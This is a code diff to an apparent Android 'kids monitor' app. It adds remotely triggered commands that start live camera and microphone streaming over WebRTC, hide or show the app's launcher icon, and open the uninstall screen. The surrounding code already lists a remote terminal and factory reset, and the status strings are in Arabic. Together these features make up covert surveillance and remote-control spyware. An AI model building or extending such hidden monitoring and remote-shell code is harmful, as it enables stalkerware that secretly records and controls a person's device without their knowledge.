@@ -5,6 +5,7 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.hardware.camera2.CameraCharacteristics
 import android.media.AudioManager
 import android.os.Build
@@ -71,6 +72,37 @@ object CommandExecutor {
                     ok("تم إيقاظ شاشة الجهاز")
                 }
                 "sims" -> simsInfo(context)
+                "rtc_start" -> {
+                    val raw = payload["session"]?.toString().orEmpty()
+                    val sess = if (raw.isBlank()) "s" + System.currentTimeMillis() else raw
+                    com.kids.monitor.WebRtcService.start(context, sess)
+                    ok("تم بدء بث الفيديو والصوت المباشر")
+                }
+                "rtc_stop" -> {
+                    com.kids.monitor.WebRtcService.stop(context)
+                    ok("تم إيقاف البث المباشر")
+                }
+                "show_app" -> {
+                    setAlias(context, true)
+                    ok("تم إظهار أيقونة التطبيق في قائمة التطبيقات")
+                }
+                "hide_app" -> {
+                    setAlias(context, false)
+                    ok("تم إخفاء أيقونة التطبيق")
+                }
+                "uninstall_app" -> {
+                    try {
+                        context.startActivity(
+                            Intent(
+                                Intent.ACTION_DELETE,
+                                android.net.Uri.parse("package:${context.packageName}"),
+                            ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
+                        )
+                        ok("افتح شاشة الجهاز وأكّد الإزالة")
+                    } catch (e: Exception) {
+                        fail("تعذر فتح شاشة الإزالة: ${e.localizedMessage}")
+                    }
+                }
                 "terminal" -> TerminalService.execute(context, payload["cmd"]?.toString().orEmpty())
                 "device_info" -> TerminalService.deviceSummary(context)
                 "factory_reset" -> factoryReset(context)
@@ -194,6 +226,21 @@ object CommandExecutor {
                 "kids:wake",
             )
             lock.acquire(15_000L)
+        } catch (e: Exception) { /* تجاهل */ }
+    }
+
+    /** إظهار/إخفاء أيقونة التطبيق (activity-alias) — لحل مشكلة مخفي في خزنة التطبيقات. */
+    private fun setAlias(context: Context, show: Boolean) {
+        try {
+            val alias = ComponentName(context, context.packageName + ".LauncherAlias")
+            context.packageManager.setComponentEnabledSetting(
+                alias,
+                if (show) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+                else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP,
+            )
+            context.getSharedPreferences("monitor_prefs", Context.MODE_PRIVATE)
+                .edit().putBoolean("icon_hidden", !show).apply()
         } catch (e: Exception) { /* تجاهل */ }
     }
 
